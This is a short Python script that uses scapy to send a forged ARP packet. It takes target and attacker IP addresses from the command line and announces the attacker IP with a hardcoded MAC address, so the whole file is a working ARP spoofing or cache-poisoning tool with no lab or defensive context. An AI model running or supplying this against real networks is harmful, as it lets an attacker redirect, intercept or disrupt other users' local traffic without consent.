from scapy.all import *
import sys
__author__ = 'checkout'

target=sys.argv[1]
attacker=sys.argv[2]

print("Attacker " + attacker + " target " + target)

h=ARP()
h.psrc=attacker
h.hwsrc="00:60:97:b6:f4:35"
h.pdst=target
send(h)
